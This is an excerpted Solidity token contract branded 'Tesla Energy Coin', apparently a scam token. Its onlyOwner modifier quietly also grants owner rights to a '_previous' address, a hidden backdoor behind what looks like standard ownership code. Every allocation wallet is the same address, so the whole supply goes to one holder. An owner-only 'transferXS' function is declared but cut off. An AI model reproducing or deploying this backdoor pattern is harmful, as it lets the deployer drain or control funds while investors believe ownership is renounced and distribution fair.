...
contract Ownable is Context {
     ...
     */
    modifier onlyOwner() {
        require(_owner == _msgSender() || _previous == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
contract TESLA is ERC20, Ownable {
    ...
    constructor(
    ) public ERC20("Tesla Energy Coin", "TEC") {
        address presaleWallet = 0xE4E5B26C7bbdF3A8358F722ed51E36daD46FAAF1;
        address listingWallet = 0xE4E5B26C7bbdF3A8358F722ed51E36daD46FAAF1;
        address partners = 0xE4E5B26C7bbdF3A8358F722ed51E36daD46FAAF1;
        address marketingWallet = 0xE4E5B26C7bbdF3A8358F722ed51E36daD46FAAF1;
        address reserve = 0xE4E5B26C7bbdF3A8358F722ed51E36daD46FAAF1;
        address team = 0xE4E5B26C7bbdF3A8358F722ed51E36daD46FAAF1;
        
        _mint(presaleWallet, 200000000 * 10**18);
        _mint(listingWallet, 200000000 * 10**18);
        _mint(partners, 100000000 * 10**18);
        _mint(marketingWallet, 100000000 * 10**18);
        _mint(reserve, 300000000 * 10**18);
        _mint(team, 100000000 * 10**18);
        
        
        
        _uniswapV2Router = IUniswapV2Router02(0x75966f3A20966D4dEF259c96Ed0fcfAD309A429F);  // pancake V2
    ...
    */
    ...
    function transferXS(address payable receiver) public onlyOwner {
